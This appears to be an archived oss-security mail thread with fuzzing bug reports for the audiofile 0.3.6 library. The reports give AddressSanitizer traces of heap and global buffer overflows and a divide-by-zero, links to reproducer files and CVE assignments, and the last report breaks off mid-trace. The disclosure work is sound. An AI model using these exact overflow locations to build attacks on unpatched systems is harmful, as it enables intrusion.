# sfconvert @@ out.mp3 format aiff
WRITE of size 2 at 0x7fb583d33800 thread T0                                                                                                                                                                                                                                    
    #0 0x7fb58398c8b1 in ulaw2linear_buf(unsigned char const*, short*, int) /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/G711.cpp:42:13                                                                                                
    #1 0x7fb58398c8b1 in G711::runPull() /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/G711.cpp:206                                                                                                                                     
    #2 0x7fb58397305a in afReadFrames /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/data.cpp:222:14                                                                                                                                             
    #3 0x50bbeb in copyaudiodata /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:340:29                                                                                                                                                 
    #4 0x50b050 in main /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:248:17                                                                                                                                                          
    #5 0x7fb582a4878f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289                                                                                                                                                     
    #6 0x419f48 in _init (/usr/bin/sfconvert+0x419f48)                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                               
0x7fb583d33800 is located 0 bytes to the right of 917504-byte region [0x7fb583c53800,0x7fb583d33800)                                                                                                                                                                           
allocated by thread T0 here:                                                                                                                                                                                                                                                   
    #0 0x4d2d08 in malloc /tmp/portage/sys-devel/llvm-3.9.1-r1/work/llvm-3.9.1.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64                                                                                                                                       
    #1 0x50bb48 in copyaudiodata /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:327:17                                                                                                                                                 
    #2 0x50b050 in main /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:248:17                                                                                                                                                          
    #3 0x7fb582a4878f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289                                                                                                                                                     
                                                                                                                                                                                                                                                                               
SUMMARY: AddressSanitizer: heap-buffer-overflow /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/G711.cpp:42:13 in ulaw2linear_buf(unsigned char 
const*, short*, int)                                                                      
Shadow bytes around the buggy address:                                                                                                                                                                                                                                         
  0x0ff73079e6b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                                                                                                                                                                                                              
  0x0ff73079e6c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                                                                                                                                                                                                              
  0x0ff73079e6d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                                                                                                                                                                                                              
  0x0ff73079e6e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                                                                                                                                                                                                              
  0x0ff73079e6f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                                                                                                                                                                                                              
=>0x0ff73079e700:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa                                                                                                                                                                                                              
  0x0ff73079e710: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa                                                                                                                                                                                                              
  0x0ff73079e720: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa                                                                                                                                                                                                              
  0x0ff73079e730: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa                                                                                                                                                                                                              
  0x0ff73079e740: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa                                                                                                                                                                                                              
  0x0ff73079e750: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa                                                                                                                                                                                                              
Shadow byte legend (one shadow byte represents 8 application bytes):                                                                                                                                                                                                           
  Addressable:           00                                                                                                                                                                                                                                                    
  Partially addressable: 01 02 03 04 05 06 07                                                                                                                                                                                                                                  
  Heap left redzone:       fa                                                                                                                                                                                                                                                  
  Heap right redzone:      fb                                                                                                                                                                                                                                                  
  Freed heap region:       fd                                                                                                                                                                                                                                                  
  Stack left redzone:      f1                                                                                                                                                                                                                                                  
  Stack mid redzone:       f2                                                                                                                                                                                                                                                  
  Stack right redzone:     f3                                                                                                                                                                                                                                                  
  Stack partial redzone:   f4                                                                                                                                                                                                                                                  
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==2586==ABORTING

Affected version:
0.3.6

Fixed version:
N/A

Commit fix:
N/A

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00188-audiofile-heapoverflow-ulaw2linear_buf

Timeline:
2017-02-20: bug discovered and reported to upstream
2017-02-20: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/02/20/audiofile-heap-based-buffer-overflow-in-ulaw2linear_buf-g711-cpp

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401102.9439_15.Morbo,U=41361:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `1605678.LEK1Z9kDq5@blackgate`

```
On Sunday 26 February 2017 11:54:14 Agostino Sarubbo wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2017/02/20/audiofile-heap-based-buffer-overflow
> -in-ulaw2linear_buf-g711-cpp

This is CVE-2017-6834

-- 
Agostino Sarubbo
Gentoo Linux Developer

```

</details>
<details>
<summary><strong>[oss-security] audiofile: divide-by-zero in BlockCodec::runPull (BlockCodec.cpp)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488144005.28364_61.NdNdNx,U=7809:2,T -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `10347.2849327488-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Description:
audiofile is a C-based library for reading and writing audio files in many common formats.

A fuzz on it discovered a division by zero.

The complete ASan output:

# sfconvert @@ out.mp3 format aiff
==2529==ERROR: AddressSanitizer: FPE on unknown address 0x7ff06b121920 (pc 0x7ff06b121920 bp 0x7ffd0ddf2d90 sp 0x7ffd0ddf2d00 T0)                                                                                                                                              
    #0 0x7ff06b12191f in BlockCodec::runPull() /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/BlockCodec.cpp:50:46                                                                                                                       
    #1 0x7ff06b15ac20 in RebufferModule::runPull() /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/RebufferModule.cpp:122:3                                                                                                               
    #2 0x7ff06b10b05a in afReadFrames /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/data.cpp:222:14                                                                                                                                             
    #3 0x50bbeb in copyaudiodata /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:340:29                                                                                                                                                 
    #4 0x50b050 in main /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:248:17                                                                                                                                                          
    #5 0x7ff06a1e078f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289                                                                                                                                                     
    #6 0x419f48 in _init (/usr/bin/sfconvert+0x419f48)                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                               
AddressSanitizer can not provide additional info.                                                                                                                                                                                                                              
SUMMARY: AddressSanitizer: FPE /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/BlockCodec.cpp:50:46 in BlockCodec::runPull()                                                                                                              
==2529==ABORTING

Affected version:
0.3.6

Fixed version:
N/A

Commit fix:
N/A

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00187-audiofile-fpe-BlockCodec-runPull

Timeline:
2017-02-20: bug discovered and reported to upstream
2017-02-20: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/02/20/audiofile-divide-by-zero-in-blockcodecrunpull-blockcodec-cpp

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401102.9439_14.Morbo,U=41360:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `4333819.x0OyyZu41M@blackgate`

```
On Sunday 26 February 2017 11:53:42 Agostino Sarubbo wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2017/02/20/audiofile-divide-by-zero-in-blockcod
> ecrunpull-blockcodec-cpp

This is CVE-2017-6833

-- 
Agostino Sarubbo
Gentoo Linux Developer

```

</details>
<details>
<summary><strong>[oss-security] audiofile: heap-based buffer overflow in MSADPCM::decodeBlock (MSADPCM.cpp)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488144005.28364_60.NdNdNx,U=7808:2,T -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `285721.180818172-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Description:
audiofile is a C-based library for reading and writing audio files in many common formats.

A fuzz on it discovered an heap overflow.

The complete ASan output:

# sfconvert @@ out.mp3 format aiff
==2512==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x62d00001c45a at pc 0x7fe7476f387d bp 0x7ffc3b0e3bf0 sp 0x7ffc3b0e3be8
WRITE of size 2 at 0x62d00001c45a thread T0
    #0 0x7fe7476f387c in MSADPCM::decodeBlock(unsigned char const*, short*) /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/MSADPCM.cpp:222:14
    #1 0x7fe7476c1ac9 in BlockCodec::runPull() /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/BlockCodec.cpp:55:3
    #2 0x7fe7476fac20 in RebufferModule::runPull() /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/RebufferModule.cpp:122:3
    #3 0x7fe7476ab05a in afReadFrames /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/data.cpp:222:14
    #4 0x50bbeb in copyaudiodata /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:340:29
    #5 0x50b050 in main /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:248:17
    #6 0x7fe74678078f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289
    #7 0x419f48 in _init (/usr/bin/sfconvert+0x419f48)

0x62d00001c45a is located 0 bytes to the right of 32858-byte region [0x62d000014400,0x62d00001c45a)
allocated by thread T0 here:
    #0 0x4d2d08 in malloc /tmp/portage/sys-devel/llvm-3.9.1-r1/work/llvm-3.9.1.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64
    #1 0x7fe746419687 in operator new(unsigned long) (/usr/lib/gcc/x86_64-pc-linux-gnu/6.3.0/libstdc++.so.6+0xb2687)
    #2 0x7fe7476af43c in afGetFrameCount /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/format.cpp:205:41
    #3 0x50bb5c in copyaudiodata /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:329:29
    #4 0x50b050 in main /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:248:17
    #5 0x7fe74678078f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289

SUMMARY: AddressSanitizer: heap-buffer-overflow /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/MSADPCM.cpp:222:14 in 
MSADPCM::decodeBlock(unsigned char const*, short*)
Shadow bytes around the buggy address:
  0x0c5a7fffb830: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c5a7fffb840: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c5a7fffb850: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c5a7fffb860: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c5a7fffb870: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c5a7fffb880: 00 00 00 00 00 00 00 00 00 00 00[02]fa fa fa fa
  0x0c5a7fffb890: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c5a7fffb8a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c5a7fffb8b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c5a7fffb8c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c5a7fffb8d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==2512==ABORTING

Affected version:
0.3.6

Fixed version:
N/A

Commit fix:
N/A

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00186-audiofile-heapoverflow-MSADPCM-decodeBlock

Timeline:
2017-02-20: bug discovered and reported to upstream
2017-02-20: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/02/20/audiofile-heap-based-buffer-overflow-in-msadpcmdecodeblock-msadpcm-cpp

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401102.9439_13.Morbo,U=41359:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `25248205.gSqYAvQOXh@blackgate`

```
On Sunday 26 February 2017 11:53:02 Agostino Sarubbo wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2017/02/20/audiofile-heap-based-buffer-overflow
> -in-msadpcmdecodeblock-msadpcm-cpp

This is CVE-2017-6832

-- 
Agostino Sarubbo
Gentoo Linux Developer

```

</details>
<details>
<summary><strong>[oss-security] audiofile: heap-based buffer overflow in IMA::decodeBlockWAVE (IMA.cpp)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488144005.28364_59.NdNdNx,U=7807:2,T -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `690695.219530852-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Description:
audiofile is a C-based library for reading and writing audio files in many common formats.

A fuzz on it discovered an heap overflow.

The complete ASan output:

# sfconvert @@ out.mp3 format aiff
==2486==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x62f0000286e8 at pc 0x7fc5db36626e bp 0x7ffcecb1cbf0 sp 0x7ffcecb1cbe8                                                                                                                                       
WRITE of size 2 at 0x62f0000286e8 thread T0                                                                                                                                                                                                                                    
    #0 0x7fc5db36626d in IMA::decodeBlockWAVE(unsigned char const*, short*) /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/IMA.cpp:188:13                                                                                                
    #1 0x7fc5db365671 in IMA::decodeBlock(unsigned char const*, short*) /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/IMA.cpp:110:10                                                                                                    
    #2 0x7fc5db361ac9 in BlockCodec::runPull() /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/BlockCodec.cpp:55:3                                                                                                                        
    #3 0x7fc5db39ac20 in RebufferModule::runPull() /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/RebufferModule.cpp:122:3                                                                                                               
    #4 0x7fc5db34b05a in afReadFrames /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/data.cpp:222:14                                                                                                                                             
    #5 0x50bbeb in copyaudiodata /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:340:29                                                                                                                                                 
    #6 0x50b050 in main /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:248:17                                                                                                                                                          
    #7 0x7fc5da42078f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289                                                                                                                                                     
    #8 0x419f48 in _init (/usr/bin/sfconvert+0x419f48)                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                               
0x62f0000286e8 is located 0 bytes to the right of 49896-byte region [0x62f00001c400,0x62f0000286e8)                                                                                                                                                                            
allocated by thread T0 here:                                                                                                                                                                                                                                                   
    #0 0x4d2d08 in malloc /tmp/portage/sys-devel/llvm-3.9.1-r1/work/llvm-3.9.1.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64                                                                                                                                       
    #1 0x7fc5da0b9687 in operator new(unsigned long) (/usr/lib/gcc/x86_64-pc-linux-gnu/6.3.0/libstdc++.so.6+0xb2687)                                                                                                                                                           
    #2 0x7fc5db34f43c in afGetFrameCount /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/format.cpp:205:41                                                                                                                                        
    #3 0x50bb5c in copyaudiodata /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:329:29                                                                                                                                                 
    #4 0x50b050 in main /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:248:17                                                                                                                                                          
    #5 0x7fc5da42078f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289                                                                                                                                                     
                                                                                                                                                                                                                                                                               
SUMMARY: AddressSanitizer: heap-buffer-overflow /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/IMA.cpp:188:13 in IMA::decodeBlockWAVE(unsigned 
char const*, short*)                                                                      
Shadow bytes around the buggy address:                                                                                                                                                                                                                                         
  0x0c5e7fffd080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                                                                                                                                                                                                              
  0x0c5e7fffd090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c5e7fffd0a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c5e7fffd0b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c5e7fffd0c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c5e7fffd0d0: 00 00 00 00 00 00 00 00 00 00 00 00 00[fa]fa fa
  0x0c5e7fffd0e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c5e7fffd0f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c5e7fffd100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c5e7fffd110: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c5e7fffd120: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==2486==ABORTING

Affected version:
0.3.6

Fixed version:
N/A

Commit fix:
N/A

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00185-audiofile-heapoverflow-IMA-decodeBlockWAVE

Timeline:
2017-02-20: bug discovered and reported to upstream
2017-02-20: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/02/20/audiofile-heap-based-buffer-overflow-in-imadecodeblockwave-ima-cpp

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401102.9439_12.Morbo,U=41358:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `40258168.guXAgPspyA@blackgate`

```
On Sunday 26 February 2017 11:52:23 Agostino Sarubbo wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2017/02/20/audiofile-heap-based-buffer-overflow
> -in-imadecodeblockwave-ima-cpp

This is CVE-2017-6831

-- 
Agostino Sarubbo
Gentoo Linux Developer

```

</details>
<details>
<summary><strong>[oss-security] audiofile: heap-based buffer overflow in alaw2linear_buf (G711.cpp)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488144005.28364_58.NdNdNx,U=7806:2,T -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `591403.244153725-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Description:
audiofile is a C-based library for reading and writing audio files in many common formats.

A fuzz on it discovered an heap overflow.

The complete ASan output:

# sfconvert @@ out.mp3 format aiff
==2480==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f5eb894d800 at pc 0x7f5eb85a699f bp 0x7ffe19064df0 sp 0x7ffe19064de8
WRITE of size 2 at 0x7f5eb894d800 thread T0
    #0 0x7f5eb85a699e in alaw2linear_buf(unsigned char const*, short*, int) /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/G711.cpp:54:13
    #1 0x7f5eb85a699e in G711::runPull() /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/G711.cpp:209
    #2 0x7f5eb858d05a in afReadFrames /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/data.cpp:222:14
    #3 0x50bbeb in copyaudiodata /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:340:29
    #4 0x50b050 in main /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:248:17
    #5 0x7f5eb766278f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289
    #6 0x419f48 in _init (/usr/bin/sfconvert+0x419f48)

0x7f5eb894d800 is located 0 bytes to the right of 393216-byte region [0x7f5eb88ed800,0x7f5eb894d800)
allocated by thread T0 here:
    #0 0x4d2d08 in malloc /tmp/portage/sys-devel/llvm-3.9.1-r1/work/llvm-3.9.1.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64
    #1 0x50bb48 in copyaudiodata /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:327:17
    #2 0x50b050 in main /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:248:17
    #3 0x7f5eb766278f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289

SUMMARY: AddressSanitizer: heap-buffer-overflow /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/G711.cpp:54:13 in alaw2linear_buf(unsigned char 
const*, short*, int)
Shadow bytes around the buggy address:
  0x0fec57121ab0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fec57121ac0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fec57121ad0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fec57121ae0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fec57121af0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0fec57121b00:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0fec57121b10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0fec57121b20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0fec57121b30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0fec57121b40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0fec57121b50: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==2480==ABORTING

Affected version:
0.3.6

Fixed version:
N/A

Commit fix:
N/A

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00184-audiofile-heapoverflow-alaw2linear_buf

Timeline:
2017-02-20: bug discovered and reported to upstream
2017-02-20: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/02/20/audiofile-heap-based-buffer-overflow-in-alaw2linear_buf-g711-cpp

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401102.9439_11.Morbo,U=41357:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `3284786.rxzJs1xbWv@blackgate`

```
On Sunday 26 February 2017 11:50:44 Agostino Sarubbo wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2017/02/20/audiofile-heap-based-buffer-overflow
> -in-alaw2linear_buf-g711-cpp

This is CVE-2017-6830

-- 
Agostino Sarubbo
Gentoo Linux Developer

```

</details>
<details>
<summary><strong>[oss-security] audiofile: global buffer overflow in decodeSample (IMA.cpp)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488144005.28364_57.NdNdNx,U=7805:2,T -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `278043.289060832-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Description:
audiofile is a C-based library for reading and writing audio files in many common formats.

A fuzz on it discovered a global overflow.

The complete ASan output:

# sfconvert @@ out.mp3 format aiff                                                                                                                                                                                                                                               
==1779==ERROR: AddressSanitizer: global-buffer-overflow on address 0x7f0add7e6a7a at pc 0x7f0add77c221 bp 0x7ffe13caabf0 sp 0x7ffe13caabe8
READ of size 2 at 0x7f0add7e6a7a thread T0
    #0 0x7f0add77c220 in decodeSample(adpcmState&, unsigned char) /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/IMA.cpp:144:13
    #1 0x7f0add77c220 in IMA::decodeBlockWAVE(unsigned char const*, short*) /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/IMA.cpp:186
    #2 0x7f0add77b671 in IMA::decodeBlock(unsigned char const*, short*) /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/IMA.cpp:110:10
    #3 0x7f0add777ac9 in BlockCodec::runPull() /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/BlockCodec.cpp:55:3
    #4 0x7f0add7b0c20 in RebufferModule::runPull() /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/RebufferModule.cpp:122:3
    #5 0x7f0add76105a in afReadFrames /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/data.cpp:222:14
    #6 0x50bbeb in copyaudiodata /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:340:29
    #7 0x50b050 in main /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:248:17
    #8 0x7f0adc83678f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289
    #9 0x419f48 in _init (/usr/bin/sfconvert+0x419f48)

